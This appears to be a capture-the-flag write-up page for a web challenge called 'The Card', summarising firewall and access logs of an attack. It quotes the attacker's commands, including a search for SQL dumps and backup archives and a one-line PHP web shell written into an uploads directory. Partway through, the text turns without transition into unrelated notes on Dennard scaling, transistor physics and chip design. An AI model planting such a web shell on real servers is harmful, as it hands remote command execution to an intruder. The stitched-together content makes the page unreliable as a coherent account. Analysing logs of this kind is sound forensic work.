---
title: the_card
parent: holmes_ctf_2025
---

## The Card

- **CTF name**: Holmes CTF 2025 After Party
- **Challenge name**: The Card
- **Challenge description**: Holmes receives a breadcrumb from Dr. Nicole Vale - fragments from a string of cyber incidents across Cogwork-1. Each lead ends the same way: a digital calling card signed JM.
- **Challenge category**: web
- **Challenge points** : 1800
Given waf.log (web application firewall), application and access logs.
Logs show victim,  Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 was attacked.
Seems the attacker requested some backup tar, a SQL dump, and upload configurations, and that allowed them to get access

```
ls -la /var/www/html
find /var/www -name "*.sql" -o -name "*.tar.gz" -o -name "*.bck"
echo "<?php system($_GET[\"cmd\"]); ?>" > /var/www/html/uploads/temp_4A4D.php
```

Using BurpSuite

Dennard Scaling
Scale transistor dimensions and operating voltage by a factor lambda
Gate delay scales as lambda

Clock frequency scales as 1/delay

Energy per signal transitions scales as lambda^3
Power is energy over time. Power scales as lambda^2
Number of devices on a chip scales as lambda ^-2

Power density, watts per centimeter, is constant

Conclusion: everything gets way better as we shrink transistors

precise manufacturing

-> we can't just keep lowering voltage; a transistor in off state creates an energy barrier for electrons moving from source to drain

Must be many times larger than random thermal energy, or transistor will leak
Operating voltage must be around 0.6 volts or more

Chips are faster than they should be by Dennard scaling, but way hotter

Electrons can quantum tunnel through the glass separating transistors

Make the glass from hafnium oxide

The gate doesn't control the electric field in the transistor strongly enough
- wrap the gate around the channel: FinFETs, Gate All Around FETs

Transistors are too small for doping to work right, there aren't enough atoms


Scaling:

Better than silicon:
- Chiplets — many smaller chips on a single ceramic, M series CPUs, GPUs
- Stacking memory chips
- Liquid nitrogen? Silicon photonics


Lasers and glass fibre, optical interconnect is better at distances


 Encase/FTK/The Sleuth Kit/Volatility